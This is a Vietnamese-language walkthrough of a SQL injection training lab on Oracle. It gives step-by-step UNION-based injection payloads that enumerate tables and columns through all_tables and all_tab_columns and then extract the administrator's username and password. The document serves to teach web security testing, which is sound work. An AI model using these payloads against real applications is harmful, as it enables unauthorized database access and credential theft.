# SQL Injection Lab 06: List Database Contents on Oracle

## Mục tiêu
Liệt kê bảng, cột trên Oracle và lấy mật khẩu của `administrator`.

## Đề bài
<img src="images/06_list-db-oracle-2026-04-14-21-46-33.png" alt="Lab overview" width="760" />
<br><br>

## Bước 1: Dò số cột và cột hiển thị text
<img src="images/06_list-db-oracle-2026-04-14-21-50-34.png" alt="Column probing" width="760" />
<br><br>

## Bước 2: Liệt kê tên bảng trên Oracle

```sql
' union select table_name, null from all_tables --
```

<img src="images/06_list-db-oracle-2026-04-14-21-52-17.png" alt="Liệt kê bảng Oracle" width="760" />
<br><br>

## Bước 3: Xác định bảng người dùng
Xác định được bảng: `USERS_XQFOYY`.

<img src="images/06_list-db-oracle-2026-04-14-21-54-19.png" alt="Bảng users Oracle" width="760" />
<br><br>

## Bước 4: Liệt kê cột của bảng users

```sql
' union select column_name, null from all_tab_columns where table_name = 'USERS_XQFOYY' --
```

<img src="images/06_list-db-oracle-2026-04-14-21-58-02.png" alt="Liệt kê cột users" width="760" />
<br><br>

## Bước 5: Lấy tài khoản administrator

```sql
' union select USERNAME_JVDZSM, PASSWORD_NKGTUE from USERS_XQFOYY where USERNAME_JVDZSM = 'administrator' --
```

<img src="images/06_list-db-oracle-2026-04-14-22-01-15.png" alt="Thông tin admin" width="760" />
<br><br>

## Bước 6: Đăng nhập và solve lab
<img src="images/06_list-db-oracle-2026-04-14-22-02-45.png" alt="Lab solved" width="760" />
<br><br>

## Payload solve

```sql
' union select USERNAME_JVDZSM, PASSWORD_NKGTUE from USERS_XQFOYY where USERNAME_JVDZSM = 'administrator' --
```

## Kết quả
Lấy được mật khẩu `administrator` và hoàn thành lab.
